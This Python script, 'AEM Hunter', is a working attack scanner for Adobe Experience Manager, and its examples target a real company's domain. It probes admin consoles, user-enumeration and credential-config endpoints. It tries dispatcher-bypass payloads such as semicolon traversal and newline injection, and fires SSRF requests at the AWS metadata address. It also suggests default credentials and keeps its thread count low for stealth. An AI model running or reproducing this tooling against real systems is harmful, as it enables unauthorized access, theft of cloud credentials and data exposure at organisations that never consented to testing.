#!/usr/bin/env python3
"""
AEM Hunter — Adobe Experience Manager Vulnerability Scanner
============================================================
Specialized scanner for AEM misconfigurations and vulnerabilities.

Checks:
  - CRX/DE Console access (content repository)
  - OSGI Console access (system admin → RCE)
  - QueryBuilder data extraction
  - Default servlet info disclosure
  - Dispatcher bypass techniques
  - SSRF via AEM endpoints
  - User/credential enumeration
  - Replication agent info leaks

Usage:
  python3 modules/aem_hunter.py --target https://aem.ferrari.com
  python3 modules/aem_hunter.py --targets targets.txt
  python3 modules/aem_hunter.py --target https://aem.ferrari.com --deep
"""

import argparse
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urljoin

import requests
import urllib3
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = f"""
{Fore.RED}
   █████╗ ███████╗███╗   ███╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
  ██╔══██╗██╔════╝████╗ ████║    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ███████║█████╗  ██╔████╔██║    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ██╔══██║██╔══╝  ██║╚██╔╝██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ██║  ██║███████╗██║ ╚═╝ ██║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
  {Fore.WHITE}AEM Misconfiguration & Vulnerability Scanner{Style.RESET_ALL}
  {Fore.YELLOW}Impact-first: Only flags what an attacker can gain{Style.RESET_ALL}
"""

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ============================================================
# AEM ENDPOINT DEFINITIONS
# Organized by severity and category
# ============================================================

CRITICAL_ENDPOINTS = {
    "CRX Console (Full Repo Access)": [
        "/crx/de/index.jsp",
        "/crx/de",
        "/crx/explorer/browser/index.jsp",
        "/crx/explorer/index.jsp",
        "/crx/search/index.jsp",
    ],
    "Package Manager (Read/Write Packages)": [
        "/crx/packmgr/index.jsp",
        "/crx/packmgr/list.jsp",
        "/crx/packmgr/service.jsp",
    ],
    "OSGI Console (RCE via Bundle Upload)": [
        "/system/console",
        "/system/console/bundles",
        "/system/console/components",
        "/system/console/configMgr",
        "/system/console/depfinder",
        "/system/console/jmx",
        "/system/console/logs",
        "/system/console/memoryusage",
        "/system/console/status-Configurations",
        "/system/console/vmstat",
    ],
    "Felix Console": [
        "///system///console",
        "/system/console/bundles/.json",
    ],
}

HIGH_ENDPOINTS = {
    "QueryBuilder (Data Extraction)": [
        "/bin/querybuilder.json",
        "/bin/querybuilder.json?type=nt:file&nodename=*.xml&p.limit=10",
        "/bin/querybuilder.json?type=cq:User&p.limit=10",
        "/bin/querybuilder.json?type=rep:User&p.limit=10",
        "/bin/querybuilder.json?path=/home/users&p.limit=10",
        "/bin/querybuilder.json?path=/content&p.limit=10",
        "/bin/querybuilder.feed.json?path=/content&p.limit=5",
    ],
    "User Enumeration": [
        "/home/users.json",
        "/home/users/a.json",
        "/home/groups.json",
        "/libs/granite/security/currentuser.json",
        "/libs/granite/security/userinfo.json",
        "/libs/cq/security/userinfo.json",
    ],
    "Replication & Discovery (Internal Infra)": [
        "/etc/replication.json",
        "/etc/replication/agents.author.json",
        "/etc/replication/agents.publish.json",
        "/etc/discovery.json",
        "/etc/reports.json",
    ],
    "Sensitive Config Files": [
        "/etc/passwords.json",
        "/etc/key.json",
        "/etc/cloudservices.json",
        "/etc/socialconfig.json",
        "/etc/workflow.json",
    ],
}

MEDIUM_ENDPOINTS = {
    "Content JSON (Info Disclosure)": [
        "/.json",
        "/content.json",
        "/content.infinity.json",
        "/content.tidy.json",
        "/content.tidy.-1.json",
        "/content/dam.json",
        "/etc.json",
        "/etc/packages.json",
        "/etc/clientlibs.json",
        "/var.json",
        "/apps.json",
        "/home.json",
        "/tmp.json",
        "/content.sysview.xml",
        "/content.docview.json",
    ],
    "Login & Auth Pages": [
        "/libs/granite/core/content/login.html",
        "/libs/cq/core/content/login.html",
        "/libs/granite/core/content/login",
        "/aem/start.html",
        "/libs/cq/gui/content/dumplibs.html",
    ],
    "Debug & Tools": [
        "/libs/cq/search/content/querydebug.html",
        "/libs/granite/ui/content/dumplibs.html",
        "/libs/cq/contentinsight/content/proxy.reportingservices.json",
        "/bin/wcmcommand",
        "/bin/receive",
    ],
    "Campaigns & User Generated Content": [
        "/content/campaigns.json",
        "/content/usergenerated.json",
        "/content/experience-fragments.json",
    ],
}

# Dispatcher bypass techniques
DISPATCHER_BYPASSES = [
    # Selector injection
    ("/{path}.json/a.css", "Selector CSS bypass"),
    ("/{path}.json/a.html", "Selector HTML bypass"),
    ("/{path}.json/a.ico", "Selector ICO bypass"),
    ("/{path}.json/a.png", "Selector PNG bypass"),
    ("/{path}.json;%0a.css", "Newline injection bypass"),
    ("/{path}.json/a.1.json", "Double extension bypass"),
    # Path manipulation
    ("///{path}.json", "Triple slash bypass"),
    ("/{path}.json?debug=layout", "Debug param bypass"),
    # Encoding
    ("/%63ontent.json", "URL encoded path"),
    ("/content%2ejson", "Encoded dot"),
    ("/content.json%23", "Fragment bypass"),
    # Semicolon trick (Apache Sling)
    ("/content/..;/crx/de/index.jsp", "Semicolon traversal to CRX"),
    ("/content/..;/system/console", "Semicolon traversal to OSGI"),
    ("/content/..;/bin/querybuilder.json", "Semicolon traversal to QB"),
    ("/content/..;/home/users.json", "Semicolon traversal to users"),
    # Sling suffix
    ("/content.json/a.4.2.1...json", "Sling suffix confusion"),
]

# SSRF test endpoints
SSRF_ENDPOINTS = [
    "/libs/granite/core/content/login.html?resource=http://169.254.169.254/latest/meta-data/",
    "/libs/granite/core/content/login.html?redirect=http://169.254.169.254/latest/meta-data/",
    "/etc/reports/servlets.json",
    "/bin/receive?sling:resourceType=nt:file&jcr:content/jcr:data=http://169.254.169.254/latest/meta-data/",
]


class AEMHunter:
    def __init__(self, targets, output_dir=None, deep=False, threads=10, timeout=15):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.deep = deep
        self.threads = threads
        self.timeout = timeout
        self.findings = {"critical": [], "high": [], "medium": [], "info": []}
        self.dispatcher_bypasses = []
        self.total_checks = 0
        self.hits = 0

        if output_dir:
            self.output_dir = output_dir
        else:
            self.output_dir = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                "output", "aem_findings"
            )
        os.makedirs(self.output_dir, exist_ok=True)

    def log(self, msg, level="info"):
        colors = {
            "info": Fore.CYAN, "success": Fore.GREEN,
            "warning": Fore.YELLOW, "error": Fore.RED,
            "critical": Fore.RED, "high": Fore.MAGENTA,
            "hit": Fore.GREEN
        }
        color = colors.get(level, Fore.WHITE)
        print(f"  {color}[{level.upper()}]{Style.RESET_ALL} {msg}")

    def check_endpoint(self, base_url, path, category="", bypass_name=""):
        """Check a single endpoint and return result if interesting."""
        url = base_url.rstrip("/") + path
        try:
            resp = requests.get(
                url,
                headers={
                    "User-Agent": USER_AGENT,
                    "Accept": "application/json, text/html, */*",
                },
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            self.total_checks += 1

            status = resp.status_code
            content_length = len(resp.content)
            content_type = resp.headers.get("Content-Type", "")

            # Interesting responses (not 403/404/302)
            if status in [200, 201, 500] or (status == 302 and "login" not in resp.headers.get("Location", "")):
                # Filter out empty or generic error pages
                if content_length > 50:
                    # Check if it's actually AEM content (not a WAF block page)
                    body_lower = resp.text[:500].lower()
                    is_waf_block = any(w in body_lower for w in [
                        "access denied", "request could not be satisfied",
                        "cloudfront", "error: the request"
                    ])

                    if not is_waf_block:
                        self.hits += 1
                        result = {
                            "url": url,
                            "status": status,
                            "content_length": content_length,
                            "content_type": content_type,
                            "category": category,
                            "bypass": bypass_name,
                            "snippet": resp.text[:300],
                            "headers": dict(resp.headers),
                        }
                        return result

            # Also flag 401 (exists but needs auth - worth investigating)
            if status == 401:
                self.hits += 1
                return {
                    "url": url,
                    "status": 401,
                    "content_length": content_length,
                    "category": category,
                    "bypass": bypass_name,
                    "snippet": "401 - Requires Authentication (endpoint EXISTS)",
                    "note": "Try default creds: admin:admin, author:author",
                }

        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass
        except Exception:
            pass

        return None

    def scan_target(self, base_url):
        """Run full AEM scan against a single target."""
        print(f"\n  {Fore.CYAN}{'─'*50}")
        print(f"  Scanning: {base_url}")
        print(f"  {'─'*50}{Style.RESET_ALL}\n")

        all_results = []

        # === CRITICAL CHECKS ===
        self.log("Checking CRITICAL endpoints (CRX, OSGI, PackMgr)...", "critical")
        for category, paths in CRITICAL_ENDPOINTS.items():
            for path in paths:
                result = self.check_endpoint(base_url, path, category)
                if result:
                    result["severity"] = "CRITICAL"
                    self.findings["critical"].append(result)
                    all_results.append(result)
                    print(f"  {Fore.RED}[CRITICAL HIT!]{Style.RESET_ALL} [{result['status']}] {result['url']}")
                    print(f"    → {category}")
                time.sleep(0.3)  # Rate limiting

        # === HIGH CHECKS ===
        self.log("Checking HIGH endpoints (QueryBuilder, Users, Replication)...", "high")
        for category, paths in HIGH_ENDPOINTS.items():
            for path in paths:
                result = self.check_endpoint(base_url, path, category)
                if result:
                    result["severity"] = "HIGH"
                    self.findings["high"].append(result)
                    all_results.append(result)
                    print(f"  {Fore.MAGENTA}[HIGH HIT!]{Style.RESET_ALL} [{result['status']}] {result['url']}")
                    print(f"    → {category}")
                time.sleep(0.3)

        # === MEDIUM CHECKS ===
        self.log("Checking MEDIUM endpoints (Content JSON, Debug, Login)...", "info")
        for category, paths in MEDIUM_ENDPOINTS.items():
            for path in paths:
                result = self.check_endpoint(base_url, path, category)
                if result:
                    result["severity"] = "MEDIUM"
                    self.findings["medium"].append(result)
                    all_results.append(result)
                    print(f"  {Fore.YELLOW}[MEDIUM HIT]{Style.RESET_ALL} [{result['status']}] {result['url']}")
                    print(f"    → {category}")
                time.sleep(0.2)

        # === DISPATCHER BYPASS (if we got 403s) ===
        if self.deep:
            self.log("Testing Dispatcher Bypass techniques...", "warning")
            test_paths = ["content", "crx/de/index.jsp", "system/console", "bin/querybuilder.json"]

            for path in test_paths:
                for bypass_template, bypass_name in DISPATCHER_BYPASSES:
                    bypass_path = bypass_template.replace("{path}", path)
                    result = self.check_endpoint(base_url, bypass_path, "Dispatcher Bypass", bypass_name)
                    if result:
                        result["severity"] = "HIGH"
                        self.findings["high"].append(result)
                        all_results.append(result)
                        self.dispatcher_bypasses.append(result)
                        print(f"  {Fore.RED}[BYPASS FOUND!]{Style.RESET_ALL} [{result['status']}] {result['url']}")
                        print(f"    → Technique: {bypass_name}")
                    time.sleep(0.2)

        # === SSRF CHECKS ===
        self.log("Testing SSRF vectors...", "critical")
        for path in SSRF_ENDPOINTS:
            result = self.check_endpoint(base_url, path, "SSRF")
            if result:
                # Check if response contains AWS metadata indicators
                if any(indicator in result.get("snippet", "").lower() for indicator in
                       ["ami-id", "instance-id", "security-credentials", "iam"]):
                    result["severity"] = "CRITICAL"
                    result["note"] = "SSRF CONFIRMED! AWS Metadata accessible!"
                    self.findings["critical"].append(result)
                    print(f"  {Fore.RED}[CRITICAL! SSRF!]{Style.RESET_ALL} {result['url']}")
                else:
                    result["severity"] = "MEDIUM"
                    self.findings["medium"].append(result)
                    print(f"  {Fore.YELLOW}[SSRF POTENTIAL]{Style.RESET_ALL} [{result['status']}] {result['url']}")
                all_results.append(result)
            time.sleep(0.5)

        return all_results

    def run(self):
        """Run the full AEM hunt."""
        print(BANNER)
        self.log(f"Targets: {len(self.targets)}", "info")
        self.log(f"Deep mode: {'ON' if self.deep else 'OFF'}", "info")
        self.log(f"Rate limit: 0.2-0.5s between requests (respectful)", "info")
        print()

        all_results = []
        for target in self.targets:
            target = target.strip()
            if not target.startswith("http"):
                target = f"https://{target}"
            results = self.scan_target(target)
            all_results.extend(results)

        self.save_results()
        self.print_summary()

    def save_results(self):
        """Save all findings."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # Critical findings (immediate action required)
        if self.findings["critical"]:
            critical_file = os.path.join(self.output_dir, f"CRITICAL_aem_findings_{timestamp}.txt")
            with open(critical_file, "w") as f:
                f.write("=" * 60 + "\n")
                f.write("CRITICAL AEM FINDINGS — IMMEDIATE ACTION\n")
                f.write("=" * 60 + "\n\n")
                for finding in self.findings["critical"]:
                    f.write(f"URL: {finding['url']}\n")
                    f.write(f"Status: {finding['status']}\n")
                    f.write(f"Category: {finding['category']}\n")
                    f.write(f"Snippet: {finding.get('snippet', '')[:200]}\n")
                    if finding.get("note"):
                        f.write(f"NOTE: {finding['note']}\n")
                    f.write("\n" + "-" * 40 + "\n\n")
            self.log(f"Critical findings: {critical_file}", "critical")

        # All findings JSON
        all_file = os.path.join(self.output_dir, f"aem_scan_results_{timestamp}.json")
        output = {
            "timestamp": datetime.now().isoformat(),
            "targets": self.targets,
            "total_checks": self.total_checks,
            "total_hits": self.hits,
            "deep_mode": self.deep,
            "findings": self.findings,
        }
        with open(all_file, "w") as f:
            json.dump(output, f, indent=2, default=str)
        self.log(f"Full results: {all_file}", "info")

        # Quick summary
        summary_file = os.path.join(self.output_dir, f"aem_summary_{timestamp}.txt")
        with open(summary_file, "w") as f:
            f.write("AEM SCAN SUMMARY\n")
            f.write(f"Targets: {', '.join(self.targets)}\n")
            f.write(f"Total checks: {self.total_checks}\n")
            f.write(f"Hits: {self.hits}\n\n")
            for severity in ["critical", "high", "medium"]:
                if self.findings[severity]:
                    f.write(f"\n{'='*40}\n{severity.upper()} ({len(self.findings[severity])})\n{'='*40}\n")
                    for finding in self.findings[severity]:
                        f.write(f"  [{finding['status']}] {finding['url']} — {finding['category']}\n")
        self.log(f"Summary: {summary_file}", "info")

    def print_summary(self):
        """Print final summary."""
        total_findings = sum(len(f) for f in self.findings.values())

        print(f"\n{Fore.RED}{'='*60}")
        print(f"  AEM HUNT COMPLETE")
        print(f"{'='*60}{Style.RESET_ALL}")
        print(f"  Total Requests:   {self.total_checks}")
        print(f"  Total Hits:       {self.hits}")
        print(f"  Critical:         {Fore.RED}{len(self.findings['critical'])}{Style.RESET_ALL}")
        print(f"  High:             {Fore.MAGENTA}{len(self.findings['high'])}{Style.RESET_ALL}")
        print(f"  Medium:           {Fore.YELLOW}{len(self.findings['medium'])}{Style.RESET_ALL}")

        if self.findings["critical"]:
            print(f"\n  {Fore.RED}{'⚠' * 20}")
            print(f"  CRITICAL FINDINGS REQUIRE IMMEDIATE ATTENTION!")
            print(f"  {'⚠' * 20}{Style.RESET_ALL}")
            for f in self.findings["critical"]:
                print(f"    → [{f['status']}] {f['url']}")
                print(f"      Category: {f['category']}")
                if f.get("note"):
                    print(f"      {Fore.RED}NOTE: {f['note']}{Style.RESET_ALL}")

        if self.findings["high"]:
            print(f"\n  {Fore.MAGENTA}HIGH FINDINGS:{Style.RESET_ALL}")
            for f in self.findings["high"]:
                print(f"    → [{f['status']}] {f['url']} — {f['category']}")

        if self.dispatcher_bypasses:
            print(f"\n  {Fore.YELLOW}DISPATCHER BYPASSES:{Style.RESET_ALL}")
            for f in self.dispatcher_bypasses:
                print(f"    → {f['bypass']}: {f['url']}")

        if total_findings == 0:
            print(f"\n  {Fore.GREEN}No direct AEM misconfigurations found.")
            print(f"  The target appears well-hardened.{Style.RESET_ALL}")
            print(f"  Next steps: Try authenticated testing, or focus on other attack vectors.")

        print(f"\n  {Fore.YELLOW}Remember: 'What can an attacker gain with this?'{Style.RESET_ALL}")
        print(f"  Output: {self.output_dir}/")
        print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}\n")


def main():
    parser = argparse.ArgumentParser(description="AEM Hunter — Adobe Experience Manager Vulnerability Scanner")
    parser.add_argument("--target", "-t", help="Single target URL (e.g., https://aem.ferrari.com)")
    parser.add_argument("--targets", "-T", help="File with list of target URLs")
    parser.add_argument("--output", "-o", help="Output directory")
    parser.add_argument("--deep", action="store_true", help="Enable deep mode (dispatcher bypass + extra checks)")
    parser.add_argument("--threads", type=int, default=5, help="Threads (default: 5, keep low for stealth)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout (default: 15)")

    args = parser.parse_args()

    if not args.target and not args.targets:
        print(f"{Fore.RED}[ERROR] Provide --target URL or --targets file{Style.RESET_ALL}")
        sys.exit(1)

    targets = []
    if args.target:
        targets = [args.target]
    elif args.targets:
        with open(args.targets, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

    hunter = AEMHunter(
        targets=targets,
        output_dir=args.output,
        deep=args.deep,
        threads=args.threads,
        timeout=args.timeout
    )
    hunter.run()


if __name__ == "__main__":
    main()
